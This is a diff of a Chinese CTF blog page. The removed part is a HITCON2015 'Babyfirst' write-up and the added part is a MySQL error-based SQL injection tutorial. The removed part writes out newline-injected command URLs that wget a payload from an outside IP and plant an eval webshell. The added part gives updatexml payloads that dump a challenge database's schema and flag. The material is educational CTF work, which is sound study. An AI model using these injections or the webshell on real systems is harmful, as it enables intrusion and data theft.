@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="CTF,Linux,PHP," />
+  <meta name="keywords" content="SQL注入,CTF," />
 
 
 
@@ -79,25 +79,32 @@
 
 
 
-<meta name="description" content="这是一道XMAN夏令营的练习题，查了下资料，发现也是HITCON2015的一道题。">
-<meta name="keywords" content="CTF,Linux,PHP">
+<meta name="description" content="什么是报错注入SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果可以出现在错误信息中。我一位好友的博客写过一个SQL注入的专栏，除了报错注入以外，别的类型也写了，而且比较详细,我个人比较推荐阅读。">
+<meta name="keywords" content="SQL注入,CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HITCON2015-Babyfirst">
-<meta property="og:url" content="http://yoursite.com/2018/08/07/HITCON2015-Babyfirst/index.html">
+<meta property="og:title" content="MySQL报错注入">
+<meta property="og:url" content="http://yoursite.com/2018/10/07/MySQL报错注入/index.html">
 <meta property="og:site_name" content="C0mRaDe&#39;s Blog">
-<meta property="og:description" content="这是一道XMAN夏令营的练习题，查了下资料，发现也是HITCON2015的一道题。">
+<meta property="og:description" content="什么是报错注入SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果可以出现在错误信息中。我一位好友的博客写过一个SQL注入的专栏，除了报错注入以外，别的类型也写了，而且比较详细,我个人比较推荐阅读。">
 <meta property="og:locale" content="zh-hk">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/5.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/6.png">
-<meta property="og:updated_time" content="2018-08-06T18:14:56.795Z">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538901102823.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538902406502.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538920549864.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538920602812.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538920781404.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538920870732.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538920922716.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538920988855.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538907315570.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538907603852.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538895222488.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538895142860.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538895109602.png">
+<meta property="og:updated_time" content="2018-10-07T14:09:28.454Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HITCON2015-Babyfirst">
-<meta name="twitter:description" content="这是一道XMAN夏令营的练习题，查了下资料，发现也是HITCON2015的一道题。">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/1.png">
+<meta name="twitter:title" content="MySQL报错注入">
+<meta name="twitter:description" content="什么是报错注入SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果可以出现在错误信息中。我一位好友的博客写过一个SQL注入的专栏，除了报错注入以外，别的类型也写了，而且比较详细,我个人比较推荐阅读。">
+<meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538901102823.png">
 
 
 
@@ -127,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/08/07/HITCON2015-Babyfirst/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/07/MySQL报错注入/"/>
 
 
 
 
 
-  <title>HITCON2015-Babyfirst | C0mRaDe's Blog</title>
+  <title>MySQL报错注入 | C0mRaDe's Blog</title>
   
 
 
@@ -240,7 +247,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/07/HITCON2015-Babyfirst/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/07/MySQL报错注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="C0mRaDe">
@@ -257,7 +264,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">HITCON2015-Babyfirst</h1>
+          <h1 class="post-title" itemprop="name headline">MySQL报错注入</h1>
         
 
         <div class="post-meta">
@@ -269,8 +276,8 @@
               
                 <span class="post-meta-item-text">發表於</span>
               
-              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-08-07T02:08:36+08:00">
-                2018-08-07
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-10-07T22:06:51+08:00">
+                2018-10-07
               </time>
             
 
@@ -329,11 +336,16 @@
       
 
       
-        <p>这是一道XMAN夏令营的练习题，查了下资料，发现也是HITCON2015的一道题。<br><a id="more"></a><br>题目给了以下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"sorry"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    exec(<span class="string">'./ '</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这里明显是要构造args为数组，正则限制了args的元素只能是字母和数字。<br>这里要用到正则表达式的一个小trick，表示结尾的$是可以匹配字符串结束时的换行符的，所以，在这题可以用一个url编码的换行符<code>%0a</code>来表示一句命令的结束。<br>注意到exec()的一开头有一个<code>./</code>，所以args的第一个参数可以随便输，然后带个换行符，然后就可以执行命令。<br>首先想到可以用wget来下载文件，要用10进制或者16进制的IP来绕过对符号的检测，这里有一个比较骚的地方，我还没搞懂：如果使用10进制IP，只能对使用nginx的服务器成功，对apache的服务器是会失败的。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/1.png" alt="image">但是，用十六进制IP，apache也可以成功。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/2.png" alt="image">接下来的问题是，通过这种方法，只能获得一个index.html，要如何才能执行php代码？这里要用到Linux的一个性质，把包含PHP代码的文件用tar打包，然后再用php去执行这个包，就可以执行包中的PHP代码：<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/3.png" alt="image">这时候还需要解决一个问题，wget获取的是index.html，既然不能出现’.’，怎么对index.html进行打包？解决方法是，先创建一个文件夹，再在这个文件夹里面wget，然后在文件夹外对文件夹进行tar打包，最后用php执行包。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/4.png" alt="image">可以看到，test中的PHP同样也可以被执行。<br><strong>解题过程</strong><br>首先在自己服务器上放一个写好的index.html，内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$f=fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">fwrite($f,<span class="string">'</span></span><br><span class="line"><span class="string">	&lt;?php phpinfo();</span></span><br><span class="line"><span class="string">	eval($_POST[1]);?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后，构造如下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://202.112.51.184:10081/?args[]=c%0a&amp;args[]=mkdir&amp;args[]=COMRADE%0a</span><br><span class="line">http://202.112.51.184:10081/?args[]=c%0A&amp;args[]=cd&amp;args[]=COMRADE%0a&amp;args[]=wget&amp;args[]=0x7BCF6311%0a</span><br><span class="line">http://202.112.51.184:10081/?args[]=c%0A&amp;args[]=tar&amp;args[]=cvf&amp;args[]=gobaby&amp;args[]=COMRADE%0a</span><br><span class="line">http://202.112.51.184:10081/?args[]=c%0A&amp;args[]=php&amp;args[]=gobaby%0a</span><br></pre></td></tr></table></figure></p>
-<p>然后，可以访问shell.php看看是否生效了。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/5.png" alt="image">可以看到，PHP代码被成功执行，接下来直接菜刀连接或者手打命令都可以了。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/6.png" alt="image"><br>这道题目做起来很好玩，思路和技巧都非常值得学习。另外，所有IP我都没有打码，希望大家别搞我，这台服务器仅仅作为平时各种测试用。</p>
-<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/09/Babyfirst-writeup/</a></p>
+        <h1 id="什么是报错注入"><a href="#什么是报错注入" class="headerlink" title="什么是报错注入"></a>什么是报错注入</h1><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果可以出现在错误信息中。我一位好友的<a href="http://hwhxy.space/2018/09/29/SQL%E6%B3%A8%E5%85%A5.html" target="_blank" rel="noopener">博客</a>写过一个SQL注入的专栏，除了报错注入以外，别的类型也写了，而且比较详细,我个人比较推荐阅读。<a id="more"></a></p>
+<h1 id="数据溢出报错"><a href="#数据溢出报错" class="headerlink" title="数据溢出报错"></a>数据溢出报错</h1><p>在某些版本中，可以通过exp函数的特性结合整数溢出的报错进行注入，比如这样<code>select (select(!x-~0)from(select(select user())x)a);</code>但是当MySQL版本&gt;5.5.53，就不能返回查询结果了，所以这里我并不去深究它。</p>
+<h1 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h1><p>利用xpath语法错误的注入用的是<code>extractvalue</code>和<code>updatexml</code>这两个函数。<code>extractvalue</code>负责在xml文档中按照xpath语法查询节点内容，<code>updatexml</code>则负责修改查询到的内容；</p>
+<blockquote>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值</p>
+</blockquote>
+<p>注入原理：这两个函数的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。例子：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538901102823.png" alt="enter description here">至于<code>extractvalue</code>，也差不多<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538902406502.png" alt="enter description here">bugkuCTF有一道题可以用报错注入,题目链接<a href="http://120.24.86.145:9001/sql/index.php" target="_blank" rel="noopener">http://120.24.86.145:9001/sql/index.php</a> <img src="https://www.github.com/coomrade/Img/raw/master/pics/1538920549864.png" alt="enter description here">一开始尝试了各种方法都没有一点反应，后面才发现，与绝大多数题目不同，这题闭合引号用的是双引号，后台估计是这种形式<code>&#39;SELECT name,code from users where name=&quot;&#39;.$name.&#39;&quot;&#39;</code>。直接输入一个<code>&quot;</code>，发现报错<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538920602812.png" alt="enter description here">既然有报错信息，那就直接上报错注入吧。构造payload<code>&quot; or updatexml(1,concat(0x7e,(select mid(group_concat(0x7c,schema_name,0x7c),20,30)from information_schema.schemata),0x7e),1)#</code>拿到数据库名<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538920781404.png" alt="enter description here">然后<code>&quot; or updatexml(1,concat(0x7e,(select mid(group_concat(0x7c,table_name,0x7c),1,30)from information_schema.tables where table_schema=&quot;bugkusql1&quot;),0x7e),1)#</code>注出表名<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538920870732.png" alt="enter description here"><code>&quot; or updatexml(1,concat(0x7e,(select mid(group_concat(0x7c,column_name,0x7c),1,30)from information_schema.columns where table_name=&quot;flag1&quot;),0x7e),1)#</code>注出列名<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538920922716.png" alt="enter description here">最后<code>&quot; or updatexml(1,concat(0x7e,(select flag1 from flag1),0x7e),1)#</code>getFlag<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538920988855.png" alt="enter description here"></p>
+<h1 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h1><p>主键重复是原理最复杂的一种报错注入，先给个payload:<code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code>效果：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538907315570.png" alt="enter description here">下面我们来分析一下原理，首先要知道MySQL的<code>group by</code>是怎样工作的，可以看<a href="https://blog.csdn.net/u010889616/article/details/48298789" target="_blank" rel="noopener">这篇文章</a>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错，我们来看看<code>floor(rand(0)*2)</code>:<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538907603852.png" alt="enter description here">由于给定了随机数种子，所以每次产生的随机数序列是一样的，再通过floor，就会生成固定的01序列。然后，当我们执行<code>select count(*) from test group by name</code>这句命令时，会建立一个虚拟表，一列是<code>key</code>，一列就是<code>count(*)</code>，其中<code>key</code>是主键，不能重复。接下来的事情，这篇<a href="https://xz.aliyun.com/t/253#toc-2" target="_blank" rel="noopener">文章</a>说得实在是详细。。我就不写了</p>
+<h1 id="配置用户时遇到的一些问题"><a href="#配置用户时遇到的一些问题" class="headerlink" title="配置用户时遇到的一些问题"></a>配置用户时遇到的一些问题</h1><p>因为要做SQL注入的题目，配置低权限用户很重要，一开始按照这个来设置的<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538895222488.png" alt="enter description here">建立了一个只能select的hack用户之后，不能登录root了<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538895142860.png" alt="enter description here">解决方法：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538895109602.png" alt="enter description here"></p>
+<h1 id="select-load-file与select-into-outfile时遇到的一些问题"><a href="#select-load-file与select-into-outfile时遇到的一些问题" class="headerlink" title="select load_file与select into outfile时遇到的一些问题"></a>select load_file与select into outfile时遇到的一些问题</h1><p>直接看这篇<a href="https://blog.csdn.net/bnxf00000/article/details/64123549" target="_blank" rel="noopener">https://blog.csdn.net/bnxf00000/article/details/64123549</a></p>
 
       
     </div>
@@ -351,11 +363,9 @@
       
         <div class="post-tags">
           
+            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
+          
             <a href="/tags/CTF/" rel="tag"># CTF</a>
-          
-            <a href="/tags/Linux/" rel="tag"># Linux</a>
-          
-            <a href="/tags/PHP/" rel="tag"># PHP</a>
           
         </div>
       
@@ -368,8 +378,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/06/12/python沙箱逃逸/" rel="next" title="python沙箱逃逸">
-                <i class="fa fa-chevron-left"></i> python沙箱逃逸
+              <a href="/2018/10/06/SQL盲注的多种姿势/" rel="next" title="SQL盲注的多种姿势">
+                <i class="fa fa-chevron-left"></i> SQL盲注的多种姿势
               </a>
             
           </div>
@@ -377,10 +387,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/13/xman-person/" rel="prev" title="XMAN2018_个人赛">
-                XMAN2018_个人赛 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -516,7 +522,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Referer"><span class="nav-number">1.</span> <span class="nav-text">Referer</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是报错注入"><span class="nav-number">1.</span> <span class="nav-text">什么是报错注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数据溢出报错"><span class="nav-number">2.</span> <span class="nav-text">数据溢出报错</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xpath语法错误"><span class="nav-number">3.</span> <span class="nav-text">xpath语法错误</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#主键重复"><span class="nav-number">4.</span> <span class="nav-text">主键重复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#配置用户时遇到的一些问题"><span class="nav-number">5.</span> <span class="nav-text">配置用户时遇到的一些问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#select-load-file与select-into-outfile时遇到的一些问题"><span class="nav-number">6.</span> <span class="nav-text">select load_file与select into outfile时遇到的一些问题</span></a></li></ol></div>
             
 
           </div>
